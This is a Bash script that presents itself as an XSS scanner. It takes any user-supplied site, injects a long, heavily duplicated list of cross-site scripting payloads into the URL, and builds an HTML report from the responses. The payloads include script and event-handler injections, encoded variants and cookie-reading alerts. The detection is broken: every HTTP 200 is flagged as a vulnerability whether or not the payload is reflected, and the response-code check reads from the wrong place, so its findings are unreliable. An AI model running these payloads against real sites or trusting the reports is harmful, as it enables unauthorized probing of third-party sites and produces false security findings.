#!/bin/bash

# Function to generate HTML report
generate_html_report() {
    local output_file="xss_scan_report.html"
    echo "<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>XSS Scan Report</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            color: #333;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        .container {
            width: 80%;
            margin: 20px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        h2 {
            color: #555;
            margin-top: 30px;
        }
        .vulnerability {
            margin-bottom: 20px;
            padding: 15px;
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
            border-radius: 5px;
        }
        .vulnerability a {
            color: #721c24;
            text-decoration: none;
        }
        .vulnerability a:hover {
            text-decoration: underline;
        }
        .response {
            margin-top: 10px;
            padding: 10px;
            background-color: #F5F5F5;
            border: 1px solid #DDD;
            border-radius: 5px;
        }
        pre {
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div class='container'>
        <h1>XSS Scan Report</h1>" > "$output_file"

    echo "<h2>Vulnerabilities Found:</h2>" >> "$output_file"

    # Copy the vulnerability details to the HTML report
    cat xss_scan_output.txt | grep "Vulnerability detected!" | while read -r line; do
        echo "<div class='vulnerability'>$line</div>" >> "$output_file"
    done

    echo "<h2>Response Details:</h2>" >> "$output_file"
    echo "<pre>" >> "$output_file"
    # Copy the response details to the HTML report
    cat xss_scan_output.txt >> "$output_file"

    echo "</pre>" >> "$output_file"
    echo "</div>
</body>
</html>" >> "$output_file"

    # Open the HTML report in Firefox
    firefox "$output_file"

    # Remove temporary files
    rm xss_scan_output.txt
    exit
}

# Function to perform XSS vulnerability scan
scan_for_xss() {
    local payload
    local response
    local target_url="$1"
    local xss_payloads=(
        "<script>alert('XSS')<\/script>"
        "<img src=x onerror=alert('XSS')>"
        "\">alert('XSS')<\/script>"
        "<svg\/onload=alert('XSS')>"
        "<iframe src=\"javascript:alert('XSS');\"><\/iframe>"
        "<img src=\"javascript:alert('XSS');\">"
        "<script>alert(String.fromCharCode(88,83,83))<\/script>"
        "<script>alert(String.fromCharCode(88,83,83))<\/script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg\/onload=alert('XSS')>"
        "<script>alert('XSS')<\/script>"
        "<svg onload=alert('XSS')>"
        "<img src=javascript:alert('XSS')>"
        "<img src=x onerror=alert('XSS')>"
        "<script>alert(\/XSS\/)<\/script>"
        "<script>alert(\/XSS\/.source)<\/script>"
        "<img src=\"http:\/\/i.imgur.com\/P8mL8.jpg\">"
        "javascript:alert('XSS')"
        "<img src=javascript:alert('XSS')>"
        "<script>alert('XSS')<\/script>"
        "<body onload=alert('XSS')>"
        "<img src=\"javascript:alert('XSS');\">"
        "<svg onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<iframe src=javascript:alert('XSS')><\/iframe>"
        "\">alert('XSS')<\/script>"
        "<script>alert(document.domain)<\/script>"
        "<script>alert(document.cookie)<\/script>"
        "<svg\/onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "<img src=javascript:alert('XSS')>"
        "<script>alert(\/XSS\/)<\/script>"
        "<script>alert(\/XSS\/.source)<\/script>"
        "<img src=\"http:\/\/i.imgur.com\/P8mL8.jpg\">"
        "javascript:alert('XSS')"
        "<img src=javascript:alert('XSS')>"
        "<script>alert('XSS')<\/script>"
        "<body onload=alert('XSS')>"
        "<img src=\"javascript:alert('XSS');\">"
        "<svg onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<iframe src=javascript:alert('XSS')><\/iframe>"
        "\">alert('XSS')<\/script>"
        "<script>alert(document.domain)<\/script>"
        "<script>alert(document.cookie)<\/script>"
        "<svg\/onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "<img src=javascript:alert('XSS')>"
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "\">alert('XSS')</script>"
        "<svg/onload=alert('XSS')>"
        "<iframe src=\"javascript:alert('XSS');\"></iframe>"
        "<img src=\"javascript:alert('XSS');\">"
        "<script>alert(String.fromCharCode(88,83,83))</script>"
        "<script>alert(String.fromCharCode(88,83,83))</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg/onload=alert('XSS')>"
        "<script>alert('XSS')</script>"
        "<svg onload=alert('XSS')>"
        "<img src=javascript:alert('XSS')>"
        "<img src=x onerror=alert('XSS')>"
        "<script>alert(/XSS/)</script>"
        "<script>alert(/XSS/.source)</script>"
        "<img src=\"http://i.imgur.com/P8mL8.jpg\">"
        "javascript:alert('XSS')"
        "<img src=javascript:alert('XSS')>"
        "<script>alert('XSS')</script>"
        "<body onload=alert('XSS')>"
        "<img src=\"javascript:alert('XSS');\">"
        "<svg onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<iframe src=javascript:alert('XSS')></iframe>"
        "\">alert('XSS')</script>"
        "<script>alert(document.domain)</script>"
        "<script>alert(document.cookie)</script>"
        "<svg/onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "<img src=javascript:alert('XSS')>"
        "<script>alert(/XSS/)</script>"
        "<script>alert(/XSS/.source)</script>"
        "<img src=\"http://i.imgur.com/P8mL8.jpg\">"
        "javascript:alert('XSS')"
        "<img src=javascript:alert('XSS')>"
        "<script>alert('XSS')</script>"
        "<body onload=alert('XSS')>"
        "<img src=\"javascript:alert('XSS');\">"
        "<svg onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<iframe src=javascript:alert('XSS')></iframe>"
        "\">alert('XSS')</script>"
        "<script>alert(document.domain)</script>"
        "<script>alert(document.cookie)</script>"
        "<svg/onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "<img src=javascript:alert('XSS')>"
        "<script>alert(/XSS/)</script>"
        "<script>alert(/XSS/.source)</script>"
        "<img src=\"http://i.imgur.com/P8mL8.jpg\">"
        "javascript:alert('XSS')"
        "<img src=javascript:alert('XSS')>"
        "<script>alert('XSS')</script>"
        "<body onload=alert('XSS')>"
        "<img src=\"javascript:alert('XSS');\">"
        "<svg onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<iframe src=javascript:alert('XSS')></iframe>"
        "\">alert('XSS')</script>"
        "<script>alert(document.domain)</script>"
        "<script>alert(document.cookie)</script>"
        "<svg/onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "<img src=javascript:alert('XSS')>"
        "<script>alert(/XSS/)</script>"
        "<script>alert(/XSS/.source)</script>"
        "<img src=\"http://i.imgur.com/P8mL8.jpg\">"
        "javascript:alert('XSS')"
        "<img src=javascript:alert('XSS')>"
        "<script>alert('XSS')</script>"
        "<body onload=alert('XSS')>"
        "<img src=\"javascript:alert('XSS');\">"
        "<svg onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<iframe src=javascript:alert('XSS')></iframe>"
        "\">alert('XSS')</script>"
        "<script>alert(document.domain)</script>"
        "<script>alert(document.cookie)</script>"
        "<svg/onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "<img src=javascript:alert('XSS')>"
        "<script>alert(/XSS/)</script>"
        "<script>alert(/XSS/.source)</script>"
        "<img src=\"http://i.imgur.com/P8mL8.jpg\">"
        "javascript:alert('XSS')"
        "<img src=javascript:alert('XSS')>"
        "<script>alert('XSS')</script>"
        "<body onload=alert('XSS')>"
        "<img src=\"javascript:alert('XSS');\">"
        "<svg onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<iframe src=javascript:alert('XSS')></iframe>"
        "\">alert('XSS')</script>"
        "<script>alert(document.domain)</script>"
        "<script>alert(document.cookie)</script>"
        "<svg/onload=alert('XSS')>"
        "<img src= onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "<img src=javascript:alert('XSS')>"
        "<img src=\"x:alert(1)\" onerror=\"eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))\">"
        "<svg/onload=alert('XSS')//"
        "<sCriPt>({0}={1}),{0}['constructor']['constructor']('alert(1)')()//"
        "<body onload=alert('XSS')>"
        "<iframe srcdoc='&lt;script&gt;alert(`XSS`)&lt;/script&gt;'></iframe>"
        "<script>document.write('<img src=\"x\" onerror=\"alert(1)\">')</script>"
        "<svg/onload=alert`1`>"
        "<iframe srcdoc='&lt;svg onload=alert(1)&gt;'></iframe>"
        "<img src onerror=alert(1)//>"
        "<a href=\"javascript:alert(1)\">XSS</a>"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"
        "<svg><script xlink:href=\"#\"><![CDATA[confirm(1)]]></script></svg>"
        "<svg><script>javascript:alert(1)</script></svg>"
        "<script src=data:,alert(1)></script>"
        "<a href=javascript:alert(1)>XSS</a>"
        "<a href=javascript:alert(1);>XSS</a>"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"
        "<img src=`` onerror=alert(1)>"
        "<script>alert`1`</script>"
        "<svg><script>alert(1)</script></svg>"
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">"
        "<img src=x onerror=alert(1);>"
        "<img src='x:gif' onerror='alert(1)'>"
        "<script>alert(1);</script>"
        "<img src='x:x' onerror='alert(1)' />"
        "<script>alert(1);</script>"
        "<svg><script>alert(1)</script></svg>"
        "<input type='text' value='<script>alert(1)</script>'>"
        "<img src=x:x onerror=alert(1);>"
        "<script>alert(1);</script>"
        "<script>alert(1)</script>"
        "<script>alert(1)</script>"
        "<img src='x:x' onerror='alert(1)' />"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"
        "<svg/onload=alert('XSS')//"
        "<sCriPt>({0}={1}),{0}['constructor']['constructor']('alert(1)')()//"
        "<body onload=alert('XSS')>"
        "<iframe srcdoc='&lt;script&gt;alert(`XSS`)&lt;/script&gt;'></iframe>"
        "<script>document.write('<img src=\"x\" onerror=\"alert(1)\">')</script>"
        "<svg/onload=alert`1`>"
        "<iframe srcdoc='&lt;svg onload=alert(1)&gt;'></iframe>"
        "<img src onerror=alert(1)//>"
        "<a href=\"javascript:alert(1)\">XSS</a>"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"
        "<svg><script xlink:href=\"#\"><![CDATA[confirm(1)]]></script></svg>"
        "<svg><script>javascript:alert(1)</script></svg>"
        "<script src=data:,alert(1)></script>"
        "<a href=javascript:alert(1)>XSS</a>"
        "<a href=javascript:alert(1);>XSS</a>"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"
        "<img src=`` onerror=alert(1)>"
        "<script>alert`1`</script>"
        "<svg><script>alert(1)</script></svg>"
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">"
        "<img src=x onerror=alert(1);>"
        "<img src='x:gif' onerror='alert(1)'>"
        "<script>alert(1);</script>"
        "<img src='x:x' onerror='alert(1)' />"
        "<script>alert(1);</script>"
        "<svg><script>alert(1)</script></svg>"
        "<input type='text' value='<script>alert(1)</script>'>"
        "<img src=x:x onerror=alert(1);>"
        "<script>alert(1);</script>"
        "<script>alert(1)</script>"
        "<script>alert(1)</script>"
        "<img src='x:x' onerror='alert(1)' />"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"
        "<svg/onload=alert('XSS')//"
        "<sCriPt>({0}={1}),{0}['constructor']['constructor']('alert(1)')()//"
        "<body onload=alert('XSS')>"
        "<iframe srcdoc='&lt;script&gt;alert(`XSS`)&lt;/script&gt;'></iframe>"
        "<script>document.write('<img src=\"x\" onerror=\"alert(1)\">')</script>"
        "<svg/onload=alert`1`>"
        "<iframe srcdoc='&lt;svg onload=alert(1)&gt;'></iframe>"
        "<img src onerror=alert(1)//>"
        "<a href=\"javascript:alert(1)\">XSS</a>"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"
        "<svg><script xlink:href=\"#\"><![CDATA[confirm(1)]]></script></svg>"
        "<svg><script>javascript:alert(1)</script></svg>"
        "<script src=data:,alert(1)></script>"
        "<a href=javascript:alert(1)>XSS</a>"
        "<a href=javascript:alert(1);>XSS</a>"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"
        "<img src=`` onerror=alert(1)>"
        "<script>alert`1`</script>"
        "<svg><script>alert(1)</script></svg>"
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">"
        "<img src=x onerror=alert(1);>"
        "<img src='x:gif' onerror='alert(1)'>"
        "<script>alert(1);</script>"
        "<img src='x:x' onerror='alert(1)' />"
        "<script>alert(1);</script>"
        "<svg><script>alert(1)</script></svg>"
        "<input type='text' value='<script>alert(1)</script>'>"
        "<img src=x:x onerror=alert(1);>"
        "<script>alert(1);</script>"
        "<script>alert(1)</script>"
        "<script>alert(1)</script>"
        "<img src='x:x' onerror='alert(1)' />"
        "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>"


    )

    echo "Scanning for XSS vulnerabilities..."

    # Iterate over payloads and inject them into URL parameters
    for payload in "${xss_payloads[@]}"; do
        echo "Testing payload: $payload"
        echo "<a href=\"$target_url$payload\" target=\"_blank\">$payload</a>" >> xss_scan_output.txt
        response=$(curl -s -w "\nRESPONSE_CODE: %{http_code}\nEFFECT: %{url_effective}\n\n" -o temp_response.txt "$target_url$payload" 2>&1)

        # Check if the payload is executed in the response
        if [[ $response == *"RESPONSE_CODE: 200"* ]]; then
            echo "Vulnerability detected! Payload: $payload"
            echo "To regenerate the vulnerability, inject the payload '<a href=\"$target_url$payload\" target=\"_blank\">$payload</a>' into the URL."
            echo "Response Code:"
            cat temp_response.txt | grep "RESPONSE_CODE"
            echo -e "\nResponse Content:"
            cat temp_response.txt
            echo "" >> xss_scan_output.txt
            cat temp_response.txt >> xss_scan_output.txt
            rm temp_response.txt
        elif [[ $response == *"RESPONSE_CODE"* ]]; then
            echo "Warning: The server returned a non-200 response code."
            echo "Response Code:"
            cat temp_response.txt | grep "RESPONSE_CODE"
            echo -e "\nResponse Content:"
            cat temp_response.txt
            echo "" >> xss_scan_output.txt
            cat temp_response.txt >> xss_scan_output.txt
            rm temp_response.txt
        elif [[ $response == *"curl: (6)"* ]]; then
            echo "Error: Could not resolve host. Please check your internet connection."
            break
        else
            echo "Payload '$payload' not successful."
            echo "Response Code:"
            cat temp_response.txt | grep "RESPONSE_CODE"
            echo -e "\nResponse Content:"
            cat temp_response.txt
            echo "" >> xss_scan_output.txt
            cat temp_response.txt >> xss_scan_output.txt
            rm temp_response.txt
        fi
    done

    # Generate HTML report
    generate_html_report
}

# Main function
main() {
    echo "XSS Vulnerability Scanner"
    echo "-------------------------"

    # Prompt user for target website link
    read -rp "Enter your target website link: " target_url

    # Perform XSS vulnerability scan
    scan_for_xss "$target_url"
}

# Call main function
main
